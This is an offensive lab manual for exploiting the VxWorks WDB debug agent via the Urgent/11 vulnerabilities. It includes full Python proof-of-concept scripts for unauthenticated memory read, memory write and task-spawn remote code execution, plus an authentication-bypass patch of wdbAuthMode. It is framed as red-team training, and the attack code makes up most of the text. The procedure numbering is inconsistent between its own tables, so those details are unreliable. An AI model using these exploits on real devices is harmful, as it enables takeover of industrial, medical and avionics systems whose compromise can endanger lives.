# Embedded RTOS Security Deep Dive — VxWorks WDB RPC Exploitation Lab

> Deep-dive companion to `skills/embedded-rtos-security/SKILL.md` and `embedded-rtos-security-playbook.md`.
>
> Audience: red teamers and exploit developers who want a hands-on, reproducible lab for VxWorks Wind River Debug (WDB) agent exploitation against the **Urgent/11** CVE chain (CVE-2019-12256 / 12258 / 12260 / 12264). This guide walks through WDB RPC protocol reverse engineering, MODE_ANY unauthenticated escalation, memory read/write primitives, and four full proof-of-concept exploits reproducible against a Wind River VxWorks 6.9.3 target in a virtualized lab.

---

## Table of Contents

1. [Introduction and Objectives](#1-introduction-and-objectives)
2. [Lab Prerequisites and Target Setup](#2-lab-prerequisites-and-target-setup)
3. [WDB RPC Protocol Internals](#3-wdb-rpc-protocol-internals)
4. [Reverse Engineering the WDB Agent Binary](#4-reverse-engineering-the-wdb-agent-binary)
5. [MODE_ANY Unauthenticated Memory Read Primitive](#5-mode_any-unauthenticated-memory-read-primitive)
6. [MODE_ANY Unauthenticated Memory Write Primitive](#6-mode_any-unauthenticated-memory-write-primitive)
7. [Task Spawn and RCE via WDB](#7-task-spawn-and-rce-via-wdb)
8. [Urgent/11 Case Studies](#8-urgent11-case-studies)
9. [Detection and Defense Bypass](#9-detection-and-defense-bypass)
10. [Capture-the-Flag Scenarios](#10-capture-the-flag-scenarios)
11. [References and Further Reading](#11-references-and-further-reading)

---

## 1. Introduction and Objectives

The Wind River Debug (WDB) agent is the single most consequential attack surface in the VxWorks ecosystem. It is a Sun RPC service speaking on UDP port 17185, registered under RPC program number `0x55555555`, designed for development-time image download, target-side debugging, and runtime object introspection. Wind River's own documentation describes WDB as "the developer's window into a running VxWorks target" — which is precisely why it is also the attacker's window.

In 2019, the Israeli security firm JSOF disclosed a family of 11 vulnerabilities in VxWorks collectively branded **Urgent/11**. The most severe of these, CVE-2019-12256, is a stack-based buffer overflow in the WDB RPC request parser itself (`wdbDbgArchLib.c`) that is reachable BEFORE the WDB authentication check on certain builds. The disclosure affected VxWorks versions from 6.5 through 6.9.3 (pre-6.9.4.1 patch level) and VxWorks 7 (pre-SR0600), with an estimated 200 million deployed devices spanning Schneider Modicon PLCs, ABB RTUs, multiple aerospace platforms, patient monitors, and enterprise networking gear.

This guide is the lab manual for reproducing and exploiting WDB agent vulnerabilities. It assumes you already know what VxWorks is, what a debug agent is, and what a stack overflow looks like in a Ghidra decompile. It does NOT assume you have ever read the WDB RPC specification or built a Sun RPC client from scratch — that is what §3 and §5 cover.

### Learning Objectives

By the end of this guide, you will be able to:

- Identify a VxWorks WDB agent across UDP 17185 and fingerprint its version to within one minor release.
- Read the WDB RPC protocol at the byte level and construct valid WDB RPC packets by hand.
- Build an unauthenticated memory read primitive that dumps target RAM at arbitrary addresses.
- Build an unauthenticated memory write primitive that patches live kernel state on the target.
- Spawn arbitrary tasks on the target via WDB task spawn, achieving remote code execution.
- Reproduce four Urgent/11 CVEs against a VxWorks 6.9.3 lab target and develop working PoC exploits.
- Identify when WDB has been "disabled" in software but remains reachable in the binary.
- Apply the WDB protocol-level methodology to other Wind River products (VxWorks 653, VxWorks Cert, Helix Virtualization Platform, Wind River Linux with VxWorks compat layer).

### Scope and Authorization

Every technique in this guide must only be executed against targets you own or have explicit written authorization to test. VxWorks deployments in avionics (ARINC-653 partitions), medical (infusion pumps, MRI consoles), industrial (PLCs, RTUs), and aerospace (multiple certified platforms) carry regulatory, liability, and life-safety considerations that dwarf a typical IT engagement. The lab setup in §2 is designed to give you a fully virtualized target — no physical hardware required — so that you can develop and test exploit code without ever touching a safety-critical device.

### Why WDB Matters in 2026

Wind River patched the Urgent/11 vulnerabilities in VxWorks 6.9.4.1 (released July 29, 2019) and VxWorks 7 SR0600. Despite this, field deployments of vulnerable VxWorks versions persist into 2026 — industrial control systems have patch cycles measured in years, certified avionics platforms have certification-bound patch cycles measured in decades, and many IoT devices shipped with VxWorks 6.x never received a patch at all. The techniques in this guide remain operationally relevant.

---

## 2. Lab Prerequisites and Target Setup

The lab runs entirely on Linux with QEMU. No physical VxWorks hardware is required. Estimated setup time: 2 hours.

### 2.1 Hardware

A modern x86_64 Linux workstation with at least 16 GB RAM and 100 GB free disk. A physical VxWorks target (e.g., a Schneider Modicon M340 BMC, a Wind River SBC, or a customer-contributed VxWorks appliance) is optional and only useful after the QEMU lab is fully working.

### 2.2 Host Operating System

Kali Linux 2025-2 (ARM64 or x86_64), Ubuntu 24.04 LTS, or Debian 12. The commands below assume Kali; substitute your package manager as needed.

### 2.3 Toolchain Installation

```bash
# Update package index and install baseline reverse engineering toolchain
sudo apt-get update
sudo apt-get install -y \
    build-essential gcc-multilib \
    binutils-arm-none-eabi gcc-arm-none-eabi \
    gdb-multiarch \
    radare2 \
    binwalk firmwalker \
    wireshark tshark tcpdump \
    python3 python3-pip python3-venv \
    qemu-system-arm qemu-system-mips qemu-user \
    openocd \
    nmap \
    rpcbind libtirpc-dev \
    git curl wget

# Python packages for exploit development
python3 -m pip install --user --upgrade \
    pwntools \
    scapy \
    ipython \
    capstone \
    keystone-engine \
    unicorn \
    angr

# Ghidra (NSA) - manual install
GHIDRA_VERSION=11.2.1
wget -q "https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_${GHIDRA_VERSION}_build/ghidra_${GHIDRA_VERSION}_PUBLIC_${GHIDRA_VERSION}.zip"
unzip -q "ghidra_${GHIDRA_VERSION}_PUBLIC_${GHIDRA_VERSION}.zip" -d ~/tools/
ln -sf ~/tools/ghidra_${GHIDRA_VERSION}_PUBLIC ~/tools/ghidra
~/tools/ghidra/ghidraRun --help | head -1

# Optional: IDA Pro (commercial) or Binary Ninja (commercial) — both have VxWorks loaders

# VxWorks WDB client community tools
git clone https://github.com/dark-lbp/vxworks_wdb.git ~/tools/vxworks_wdb
# Reference writeup: https://www.arp339.com/posts/vxworks-wdb-protocol/

# Wind River VxWorks 7 SDK (open-source kernel module build system)
git clone https://github.com/WindRiver-Labs/vxworks7-sdk.git ~/tools/vxworks7-sdk
```

### 2.4 QEMU VxWorks Target

Wind River publishes a VxWorks 7 image suitable for QEMU. For Urgent/11 reproduction, however, we need a VxWorks 6.9.3 image. The community has produced several VxWorks 6.9.x QEMU images — use one from your own lab acquisition or build a custom one from the VxWorks 6.9 Evaluation DVD (Wind River provides 30-day evaluations to qualifying researchers).

Once you have a VxWorks image (e.g., `vxWorks.bin` and `bootrom.bin`), boot it under QEMU:

```bash
# QEMU launch script: boot_vxworks.sh
cat > ~/lab/vxworks/boot_vxworks.sh <<'EOF'
#!/bin/bash
# Boot VxWorks 6.9.x under QEMU (ARM Cortex-R target, e.g., TI TMS570)
VXWORKS_IMAGE="${1:-$HOME/lab/vxworks/vxWorks.bin}"
BOOTROM="${2:-$HOME/lab/vxworks/bootrom.bin}"

qemu-system-arm \
    -M netduino2 \
    -kernel "$BOOTROM" \
    -serial mon:stdio \
    -nographic \
    -netdev user,id=net0,hostfwd=udp::17185-:17185,hostfwd=tcp::23-:23 \
    -device stellaris_enet,netdev=net0

# Notes:
# - hostfwd forwards host port 17185/udp to the guest's WDB agent
# - hostfwd forwards host port 23/tcp to the guest's Telnet shell (if enabled)
# - The netduino2 machine emulates a Stellaris LM3S6965 (Cortex-M3); for a Cortex-R
#   target, use -M vexpress-a9 or a custom -dtb
EOF
chmod +x ~/lab/vxworks/boot_vxworks.sh

# Verify the target is up by probing WDB
~/lab/vxworks/boot_vxworks.sh &
sleep 10
nmap -sU -p 17185 127.0.0.1
# Expected output: 17185/udp open wdb-router
```

### 2.5 Network Configuration

Place the QEMU target on an isolated host-only network to prevent accidental exposure of WDB to your production LAN:

```bash
# Create a host-only network (libvirt-style)
sudo virsh net-create <<EOF
<network>
  <name>vxworks-lab</name>
  <bridge name='virbr-vxw'/>
  <ip address='192.168.99.1' netmask='255.255.255.0'>
    <dhcp>
      <range start='192.168.99.100' end='192.168.99.200'/>
    </dhcp>
  </ip>
</network>
EOF

# Run QEMU with --netdev socket or bridge bound to virbr-vxw
# Ensure 192.168.99.0/24 is NOT routable from your LAN (default for libvirt)
ip route show | grep 192.168.99
```

### 2.6 Snapshot and Recovery

Take a QEMU snapshot of a known-good state so you can revert after each destructive test:

```bash
# In the QEMU monitor (Ctrl-A X to enter, Ctrl-A C to exit)
(qemu) savevm baseline-6.9.3
# ...later...
(qemu) loadvm baseline-6.9.3
```

### 2.7 Wireshark Dissector for WDB RPC

Wireshark ships a Sun RPC dissector that decodes the RPC headers. The WDB-specific payload is opaque unless you add a custom Lua dissector. A minimal starting point:

```lua
-- ~/lab/vxworks/wdb_dissector.lua
-- Wireshark Lua dissector for WDB RPC payload (program 0x55555555)
local wdb_proto = Proto("wdb", "Wind River Debug Agent")

local proc_names = {
    [1] = "MODE_ANY",
    [2] = "TARGET_PING",
    [3] = "TARGET_CONNECT",
    [4] = "CTX_READ",
    [5] = "CTX_WRITE",
    [6] = "TASK_SPAWN",
    [7] = "TASK_CONT",
    [8] = "EVENT_GET",
    [9] = "FUNC_CALL",
    [10] = "BP_ADD",
    [11] = "BP_DEL",
    [12] = "MEM_READ",
    [13] = "MEM_WRITE",
    [14] = "REG_READ",
    [15] = "REG_WRITE"
}

function wdb_proto.dissector(buffer, pinfo, tree)
    local length = buffer:len()
    if length < 24 then return end
    pinfo.cols.protocol = "WDB"
    local subtree = tree:add(wdb_proto, buffer(), "Wind River Debug Agent")
    subtree:add(buffer(0,4), "XID: 0x" .. buffer(0,4):uint())
    local msg_type = buffer(4,4):uint()
    subtree:add(buffer(4,4), "Msg Type: " .. (msg_type == 0 and "CALL" or "REPLY"))
    subtree:add(buffer(8,4), "RPC Version: " .. buffer(8,4):uint())
    subtree:add(buffer(12,4), "Program: 0x" .. string.format("%x", buffer(12,4):uint()))
    subtree:add(buffer(16,4), "Version: " .. buffer(16,4):uint())
    local proc = buffer(20,4):uint()
    subtree:add(buffer(20,4), "Procedure: " .. (proc_names[proc] or tostring(proc)))
end

-- Register on UDP port 17185
local udp_table = DissectorTable.get("udp.port")
udp_table:add(17185, wdb_proto)
```

Load it via `wireshark -X lua_script:~/lab/vxworks/wdb_dissector.lua` or copy into `~/.config/wireshark/plugins/`.

---

## 3. WDB RPC Protocol Internals

WDB is a Sun RPC (ONC RPC, RFC 5531) service. Understanding the byte-level framing is mandatory for exploit development.

### 3.1 RPC Program Number

WDB is registered under RPC program number `0x55555555` (decimal 1431655765). This is in the "user-defined" range (`0x40000000` - `0x5FFFFFFF`) reserved for transient or vendor programs. Wind River chose this constant in the early 1990s; it has never changed.

### 3.2 Transport Binding

| Transport | Port | Notes |
|-----------|------|-------|
| UDP 17185 | Default | Stateless; preferred for `MODE_ANY` and `TARGET_PING` |
| TCP 17185 | Optional | Used by Momentics IDE for stateful sessions; vulnerable to the same bugs |
| UDP 17185 broadcast | Common | Field service tools use broadcast discovery |

Verify with `rpcinfo`:

```bash
# Query the RPC portmapper (TCP/UDP 111) — VxWorks runs portmap if RPC_MGMT enabled
rpcinfo -p 192.168.99.100
# program vers proto   port  service
#  100000    4   udp    111  portmapper
#  ...
# 1431655765 1   udp  17185  (unknown)  <-- WDB

# Or probe WDB directly without portmapper
rpcinfo -T udp 192.168.99.100 1431655765 1
# program 1431655765 version 1 ready and waiting
```

### 3.3 RPC Header Layout (Call)

The Sun RPC call header for WDB is exactly 40 bytes (before credentials and verifier):

```
Offset  Size  Field             Value
------  ----  ----------------  ----------------------------------
0x00    4     XID               Arbitrary transaction ID
0x04    4     Message Type      0 = CALL
0x08    4     RPC Version       2 (always 2 for ONC RPC)
0x0C    4     Program           0x55555555 (WDB)
0x10    4     Program Version   1
0x14    4     Procedure         See §3.5
0x18    4     Credentials Flavor See §3.4
0x1C    4     Credentials Size  Variable
0x20    N     Credentials Body  Variable
0x20+N  4     Verifier Flavor   See §3.4
0x24+N  4     Verifier Size     Variable
0x28+N  M     Verifier Body     Variable
```

All multi-byte fields are big-endian (network byte order).

### 3.4 Authentication Flavors

Sun RPC defines several credential flavors. WDB historically accepts:

| Flavor | Constant | Behavior |
|--------|----------|----------|
| `AUTH_NONE` | 0 | No authentication — the default for `MODE_ANY` on VxWorks <= 6.9.3 |
| `AUTH_UNIX` | 1 | UID/GID + hostname — accepted if `INCLUDE_WDB_AUTH_UNIX` |
| `AUTH_SHORT` | 2 | Server-issued short credential — never seen on WDB |
| `AUTH_DES` | 3 | Diffie-Hellman — accepted if `INCLUDE_WDB_AUTH_DES` |
| `AUTH_KRB5` | 6 | Kerberos V5 — accepted if `INCLUDE_WDB_AUTH_GSS` |

**Critical observation**: VxWorks 6.9.x ships with `AUTH_NONE` accepted by default. The WDB "authentication mode" is set at runtime via `wdbConfig()` and exposed as `WDB_MODE_ANY` (no auth, all RPC calls succeed), `WDB_MODE_LOCAL` (only calls from `127.0.0.1` are accepted), or `WDB_MODE_PASSWORD` (an additional password verifier is required). Field deployments of VxWorks 6.5 - 6.9.3 routinely left `WDB_MODE_ANY` in place because it is the development default and the field service tooling depends on it.

### 3.5 Procedure Numbers

The WDB RPC procedures of greatest interest to a red team:

| Proc | Name | Auth | Impact |
|------|------|------|--------|
| 1 | `MODE_ANY` | None | Probe and version fingerprint |
| 2 | `TARGET_PING` (`tgtPing`) | None | Liveness check |
| 3 | `TARGET_CONNECT` | None | Open a debug session |
| 4 | `TARGET_DISCONNECT` | None | Close a debug session |
| 5 | `CTX_READ` (`wdbCtxRead`) | None | Read memory at arbitrary address |
| 6 | `CTX_WRITE` (`wdbCtxWrite`) | None | Write memory at arbitrary address |
| 7 | `FUNC_CALL` (`wdbFuncCall`) | None | Call any function pointer |
| 8 | `TASK_SPAWN` (`wdbTaskSpawn`) | None | Spawn a task (RCE) |
| 9 | `EVENT_GET` | None | Pull events from target (log, fault) |
| 12 | `MEM_READ` (`wdbMemRead`) | None | Raw memory read (no context) |
| 13 | `MEM_WRITE` (`wdbMemWrite`) | None | Raw memory write (no context) |
| 16 | `REG_READ` | None | Read register by index |
| 17 | `REG_WRITE` | None | Write register by index |
| 19 | `BP_ADD` | None | Set breakpoint |
| 20 | `BP_DEL` | None | Remove breakpoint |

### 3.6 A Worked Example: `tgtPing` (Proc 2)

The minimal "are you alive" probe. Wire format (hex):

```
00 00 00 05   -- XID = 5
00 00 00 00   -- msg_type = CALL (0)
00 00 00 02   -- rpc_vers = 2
55 55 55 55   -- program = WDB (0x55555555)
00 00 00 01   -- version = 1
00 00 00 02   -- procedure = 2 (TARGET_PING)
00 00 00 00   -- cred flavor = AUTH_NONE (0)
00 00 00 00   -- cred length = 0
00 00 00 00   -- verf flavor = AUTH_NONE (0)
00 00 00 00   -- verf length = 0
```

A reply from a vulnerable VxWorks target:

```
00 00 00 05   -- XID = 5 (matches request)
00 00 00 01   -- msg_type = REPLY (1)
00 00 00 00   -- reply_state = MSG_ACCEPTED (0)
00 00 00 00   -- verf flavor = AUTH_NONE
00 00 00 00   -- verf length = 0
00 00 00 00   -- accept_state = SUCCESS (0)
00 00 00 01   -- tgtPing reply: 1 (alive)
```

---

## 4. Reverse Engineering the WDB Agent Binary

Before writing the first exploit, locate the WDB agent binary in the target firmware and reverse it in Ghidra.

### 4.1 Locating the WDB Agent in a VxWorks Image

A VxWorks run-time image is typically a single monolithic binary (no ELF header on VxWorks 6.x; VxWorks 7 uses ELF). To analyze it:

```bash
# 1. Extract strings indicating WDB presence
strings -a -tx vxWorks.bin | grep -iE 'wdb|WDB_MODE|tgtPing|Wind River' | head -30
# Expected hits:
#   17185 wdbDbgArchLib
#   17200 WDB_MODE_ANY
#   17264 wdbCtxRead
#   ...

# 2. Locate the VxWorks symbol table (annex)
# The image footer contains a structure pointing to the sym table
python3 << 'EOF'
import struct, sys
data = open('vxWorks.bin', 'rb').read()
# VxWorks 6.x footer: last 16 bytes contain the magic + sym table offset
footer = data[-16:]
# Look for the 'WRS' magic
idx = data.find(b'\x00WRS\x00')
if idx >= 0:
    print(f"WRS magic at 0x{idx:x}")
    # Following the magic is the symbol table address and count
EOF

# 3. Use a Ghidra VxWorks loader script
# Ghidra/Features/base/src/main/java/ghidra/app/util/opinion/VxWorksLoader.java
# Supports VxWorks 5.x and 6.x. Import as: File > Import File > Format: VxWorks
```

### 4.2 Ghidra Project Setup

1. Launch Ghidra, create project `~/lab/vxworks/vxworks_6_9_3.gpr`.
2. Import `vxWorks.bin` with format `VxWorks` and language `ARM:LE:32:Cortex`.
3. Run the auto-analyzer with the `Decompiler Parameter ID` and `Aggressive Instruction Finder` options enabled.
4. After analysis (10-30 minutes for a 4 MB image), open the Symbol Tree and search for `wdbDbgArchLib`, `wdbCtxRead`, `wdbTaskSpawn`.

### 4.3 Identifying the WDB RPC Dispatcher

The RPC dispatcher is the function that receives a parsed RPC call and dispatches to the per-procedure handler. In VxWorks 6.9.x, it lives in `wdbRpcLib.c` and is typically named `wdbRpcDispatch` or `wdbSvcProc`.

Decompile the dispatcher and locate the procedure switch. You will see something like:

```c
// Pseudocode of wdbRpcDispatch in VxWorks 6.9.3
int wdbRpcDispatch(struct svc_req *rqstp, SVCXPRT *xprt) {
    switch (rqstp->rq_proc) {
        case 1:  return wdbModeAny(...);
        case 2:  return wdbTgtPing(...);
        case 3:  return wdbTargetConnect(...);
        case 5:  return wdbCtxRead(...);
        case 6:  return wdbCtxWrite(...);
        case 7:  return wdbFuncCall(...);
        case 8:  return wdbTaskSpawn(...);
        ...
        default: svcerr_noproc(xprt); return -1;
    }
}
```

### 4.4 Decompiling `wdbDbgArchLib` (CVE-2019-12256 vulnerable code path)

The CVE-2019-12256 stack overflow is in the `wdbDbgArchLib.c` module, in the function that parses the WDB debug event request payload. The vulnerable code path is reached when an oversized "info" field is supplied in a `EVENT_GET` request. The patched version bounds-checks the field length; the vulnerable version uses `strlen()` to size a stack-allocated buffer copy.

Locate the function via the symbol `wdbDbgArchEvtGet` or `wdbDbgEvtGet`. In Ghidra's decompiler:

```c
// Vulnerable code (paraphrased from VxWorks 6.9.3 wdbDbgArchLib.c)
STATUS wdbDbgArchEvtGet(WDB_CTX *pCtx, char *info, UINT32 infoLen, ...) {
    char localBuf[64];  // <-- fixed-size stack buffer
    // Bug: infoLen is not bounds-checked against sizeof(localBuf)
    memcpy(localBuf, info, infoLen);  // <-- OVERFLOW when infoLen > 64
    ...
}
```

The ROP chain for exploitation depends on the architecture (ARM Cortex-R, PowerPC e500, MIPS32). For ARM Cortex-R, the gadget hunt starts in `vxWorks.bin` itself — there is no ASLR on VxWorks 6.x, so gadget addresses are stable across boots.

---

## 5. MODE_ANY Unauthenticated Memory Read Primitive

The `wdbCtxRead` procedure (proc 5) reads target memory at an arbitrary address. On `WDB_MODE_ANY` deployments, no authentication is required.

### 5.1 Building the Request

The `wdbCtxRead` payload format (after the RPC header):

```
Offset  Size  Field
------  ----  -----
0x00    4     Context type (1=SYSTEM, 2=TASK, 3=ANY)
0x04    4     Context ID (task ID or 0 for SYSTEM)
0x08    4     Address (target virtual address)
0x0C    4     Length (number of bytes to read)
0x10    4     Mode (0=raw, 1=with virtual-to-physical translation)
```

### 5.2 Python PoC: `wdb_ctx_read.py`

```python
#!/usr/bin/env python3
"""
wdb_ctx_read.py — VxWorks WDB unauthenticated memory read primitive
Reads `length` bytes from `address` on target WDB agent.

Reference: CVE-2019-12256 ecosystem; JSOF Urgent/11 technical writeup
"""
import argparse
import socket
import struct
import sys

WDB_PROGRAM = 0x55555555
WDB_VERSION = 1
WDB_PROC_CTX_READ = 5

def build_rpc_header(xid: int, proc: int) -> bytes:
    """Build a 40-byte Sun RPC CALL header for WDB with AUTH_NONE."""
    return struct.pack('>IIIIIIIIII',
        xid,
        0,             # msg_type = CALL
        2,             # rpc_vers
        WDB_PROGRAM,
        WDB_VERSION,
        proc,
        0, 0,          # cred flavor=AUTH_NONE, length=0
        0, 0,          # verf flavor=AUTH_NONE, length=0
    )

def parse_rpc_reply(data: bytes) -> tuple:
    """Parse the RPC reply. Returns (success, payload_bytes)."""
    if len(data) < 24:
        return (False, b'')
    xid, msg_type, reply_state = struct.unpack('>III', data[0:12])
    verf_flavor, verf_len = struct.unpack('>II', data[12:20])
    verf_end = 20 + verf_len
    accept_state = struct.unpack('>I', data[verf_end:verf_end+4])[0]
    payload = data[verf_end+4:]
    return (accept_state == 0, payload)

def wdb_ctx_read(target_ip: str, target_port: int, address: int, length: int,
                 context_type: int = 1, context_id: int = 0) -> bytes:
    """Read `length` bytes from `address` via WDB CTX_READ."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3.0)

    header = build_rpc_header(xid=0x12345678, proc=WDB_PROC_CTX_READ)
    payload = struct.pack('>IIIII',
        context_type,  # 1 = SYSTEM context
        context_id,    # 0 for SYSTEM
        address,
        length,
        0,             # mode = raw read
    )
    packet = header + payload
    s.sendto(packet, (target_ip, target_port))
    reply, _ = s.recvfrom(65535)
    success, data = parse_rpc_reply(reply)
    if not success:
        raise RuntimeError(f"WDB CTX_READ failed; raw reply: {reply.hex()}")
    return data[:length]

def main():
    p = argparse.ArgumentParser()
    p.add_argument('--target', required=True, help='Target IP')
    p.add_argument('--port', type=int, default=17185)
    p.add_argument('--address', required=True, help='Hex target address (e.g., 0x00100000)')
    p.add_argument('--length', type=int, default=64, help='Bytes to read (1-4096)')
    args = p.parse_args()

    addr = int(args.address, 16) if args.address.startswith('0x') else int(args.address)
    data = wdb_ctx_read(args.target, args.port, addr, args.length)
    sys.stdout.buffer.write(data)

if __name__ == '__main__':
    main()
```

### 5.3 Using the Primitive

```bash
# Read the VxWorks boot line (typically at a known fixed address)
# Example: on VxWorks 6.9 for TI TMS570, the boot line is at 0x00004000
python3 wdb_ctx_read.py --target 192.168.99.100 --address 0x00004000 --length 256 | xxd | head

# Dump the entire low memory region (first 64 KB)
python3 -c "
from wdb_ctx_read import wdb_ctx_read
import sys
for offset in range(0, 0x10000, 512):
    data = wdb_ctx_read('192.168.99.100', 17185, offset, 512)
    sys.stdout.buffer.write(data)
" > /tmp/vxworks_lowmem.bin

# Extract the VxWorks version string from the dump
strings /tmp/vxworks_lowmem.bin | grep -i 'VxWorks'
# Expected: 'VxWorks 6.9.3.0 / Wind River Systems, Inc.'
```

### 5.4 Reading Sensitive Data via CTX_READ

The CTX_READ primitive exposes the entire kernel address space. High-value targets:

| Address Range | Content |
|---------------|---------|
| `0x00000000 - 0x00004000` | Interrupt vector table (ARM: exception vectors) |
| `0x00004000 - 0x00005000` | VxWorks boot line |
| Variable | `sysBootLine` global — boot parameters including TFTP server IP, file path |
| Variable | `usrAppInit` arguments — application startup configuration |
| Variable | Target's DHCP lease table (if DHCP client in use) |
| Variable | Any loaded crypto key material (mbedTLS, wolfSSL contexts) |

Locate the addresses of these symbols via the VxWorks symbol table dump (see §4.1).

---

## 6. MODE_ANY Unauthenticated Memory Write Primitive

The `wdbCtxWrite` procedure (proc 6) is the symmetric write primitive. With `WDB_MODE_ANY`, it allows patching live kernel memory.

### 6.1 Payload Format

```
Offset  Size  Field
------  ----  -----
0x00    4     Context type (1=SYSTEM, 2=TASK, 3=ANY)
0x04    4     Context ID
0x08    4     Address
0x0C    4     Length
0x10    N     Data (N = Length, byte-aligned)
```

### 6.2 Python PoC: `wdb_ctx_write.py`

```python
#!/usr/bin/env python3
"""
wdb_ctx_write.py — VxWorks WDB unauthenticated memory write primitive
Writes `data` to `address` on target WDB agent.

CRITICAL: This primitive modifies live kernel state. Always test on a lab
target with QEMU snapshots; never against production hardware.
"""
import argparse
import socket
import struct

WDB_PROGRAM = 0x55555555
WDB_VERSION = 1
WDB_PROC_CTX_WRITE = 6

def build_rpc_header(xid: int, proc: int) -> bytes:
    return struct.pack('>IIIIIIIIII',
        xid, 0, 2, WDB_PROGRAM, WDB_VERSION, proc, 0, 0, 0, 0)

def wdb_ctx_write(target_ip: str, target_port: int, address: int, data: bytes) -> bool:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3.0)
    header = build_rpc_header(xid=0xABCDEF01, proc=WDB_PROC_CTX_WRITE)
    payload = struct.pack('>III', 1, 0, address) + struct.pack('>I', len(data)) + data
    s.sendto(header + payload, (target_ip, target_port))
    reply, _ = s.recvfrom(65535)
    # A successful write returns accept_state=0 with empty payload
    return len(reply) >= 24 and struct.unpack('>I', reply[20:24])[0] == 0

def main():
    p = argparse.ArgumentParser()
    p.add_argument('--target', required=True)
    p.add_argument('--port', type=int, default=17185)
    p.add_argument('--address', required=True)
    p.add_argument('--file', required=True, help='File with bytes to write')
    args = p.parse_args()

    addr = int(args.address, 16) if args.address.startswith('0x') else int(args.address)
    with open(args.file, 'rb') as f:
        data = f.read()

    ok = wdb_ctx_write(args.target, args.port, addr, data)
    print(f"Write {len(data)} bytes to 0x{addr:08x}: {'OK' if ok else 'FAIL'}")

if __name__ == '__main__':
    main()
```

### 6.3 Demonstrating the Primitive — Patching the Banner

A safe demonstration that modifies no security-critical state:

```bash
# 1. Read the current banner string (find its address via the sym table)
python3 wdb_ctx_read.py --target 192.168.99.100 \
    --address 0x00123456 --length 64 | xxd
# Suppose it contains: "VxWorks 6.9.3.0"

# 2. Write a patched banner
printf 'PWNED-6.9.3.0\x00' > /tmp/patch.bin
python3 wdb_ctx_write.py --target 192.168.99.100 \
    --address 0x00123456 --file /tmp/patch.bin

# 3. Verify
python3 wdb_ctx_read.py --target 192.168.99.100 \
    --address 0x00123456 --length 64 | xxd | head -1
# Should show: 'PWNED-6.9.3.0'
```

### 6.4 Demonstrating the Primitive — Disabling WDB_AUTH at Runtime

A more aggressive demonstration: find the global `wdbAuthMode` variable and overwrite it to force `WDB_MODE_ANY`:

```bash
# 1. Find wdbAuthMode address via sym table (suppose 0x00204000)
# 2. Read current value (should be 0 for MODE_ANY, 2 for MODE_PASSWORD)
python3 wdb_ctx_read.py --target 192.168.99.100 \
    --address 0x00204000 --length 4 | xxd
# 00000000  00 00 00 00                                          |....|

# 3. If it's not 0 (e.g., WDB_MODE_PASSWORD = 2), write 0 to force MODE_ANY
printf '\x00\x00\x00\x00' > /tmp/authmode.bin
python3 wdb_ctx_write.py --target 192.168.99.100 \
    --address 0x00204000 --file /tmp/authmode.bin

# 4. The target now accepts unauthenticated calls even if it was configured
#    for password auth at boot
```

This is the bridge primitive between "the target has WDB_MODE_PASSWORD" and "I have full unauthenticated RCE". The `INCLUDE_WDB_AUTH` configuration flag must be enabled at compile time for the password check to exist; if it is enabled, the check is enforced in `wdbSvcProc` BEFORE procedure dispatch. Bypassing it requires either (a) the runtime variable patch above (when accessible via an unauthenticated CTX_READ/WRITE — only possible if some OTHER procedure is reachable pre-auth) or (b) exploiting the CVE-2019-12256 parser overflow which fires before the auth check.

---

## 7. Task Spawn and RCE via WDB

The `wdbTaskSpawn` procedure (proc 8) is the direct RCE primitive. It accepts a function pointer and an argument list, and spawns a VxWorks task executing that function.

### 7.1 Payload Format

The `wdbTaskSpawn` payload is more complex than CTX_READ/WRITE because it includes a `WDB_TASK_SPAWN_PARMS` structure:

```
Offset  Size  Field
------  ----  -----
0x00    4     Context (1=SYSTEM)
0x04    4     Context ID (0)
0x08    4     Function address (target virtual address)
0x0C    4     Argument count (1-10)
0x10    4*N   Argument values (N = arg count)
0x10+   4     Task priority (0-255; 100 is typical)
0x14+   4     Stack size (bytes; 0x4000 is typical)
0x18+   4     Task options (VX_FP_TASK = 0x8 typically)
0x1C+   32    Task name (null-terminated string, max 31 chars)
```

### 7.2 Python PoC: `wdb_task_spawn.py`

```python
#!/usr/bin/env python3
"""
wdb_task_spawn.py — VxWorks WDB unauthenticated task spawn (RCE)
Spawns a task on the target executing `func_addr(arg1, arg2, ...)`.

Common targets for func_addr:
- shellCmd: address of the VxWorks shell command dispatcher
- printf: address of printf (for trivial PoC)
- taskSpawn: native task spawn (equivalent to no-op on already-spawned agent)
- A user-supplied address of in-RAM shellcode (after MEM_WRITE)

Reference: dark-lbp/vxworks_wdb repository
"""
import argparse
import socket
import struct

WDB_PROGRAM = 0x55555555
WDB_VERSION = 1
WDB_PROC_TASK_SPAWN = 8

VX_FP_TASK = 0x8

def build_rpc_header(xid: int, proc: int) -> bytes:
    return struct.pack('>IIIIIIIIII',
        xid, 0, 2, WDB_PROGRAM, WDB_VERSION, proc, 0, 0, 0, 0)

def wdb_task_spawn(target_ip: str, target_port: int, func_addr: int,
                   args: list, name: str = 'pwn', priority: int = 100,
                   stack_size: int = 0x4000) -> int:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)

    if len(args) > 10:
        raise ValueError("Max 10 arguments")

    header = build_rpc_header(xid=0xDEADBEEF, proc=WDB_PROC_TASK_SPAWN)
    payload = struct.pack('>IIII',
        1,              # context type = SYSTEM
        0,              # context ID = 0
        func_addr,      # function address
        len(args),      # argument count
    )
    for arg in args:
        payload += struct.pack('>I', arg)

    payload += struct.pack('>III',
        priority,
        stack_size,
        VX_FP_TASK,
    )
    name_bytes = name.encode('utf-8')[:31].ljust(32, b'\x00')
    payload += name_bytes

    s.sendto(header + payload, (target_ip, target_port))
    reply, _ = s.recvfrom(65535)
    # Reply contains the spawned task ID
    if len(reply) < 28:
        return -1
    return struct.unpack('>I', reply[24:28])[0]

def main():
    p = argparse.ArgumentParser()
    p.add_argument('--target', required=True)
    p.add_argument('--port', type=int, default=17185)
    p.add_argument('--func', required=True, help='Hex function address')
    p.add_argument('--args', default='', help='Comma-separated hex args')
    p.add_argument('--name', default='pwn')
    args = p.parse_args()

    func = int(args.func, 16)
    arg_list = [int(a, 16) for a in args.args.split(',') if a.strip()]
    task_id = wdb_task_spawn(args.target, args.port, func, arg_list, args.name)
    print(f"Spawned task {args.name} (ID=0x{task_id:08x}) executing 0x{func:08x}")

if __name__ == '__main__':
    main()
```

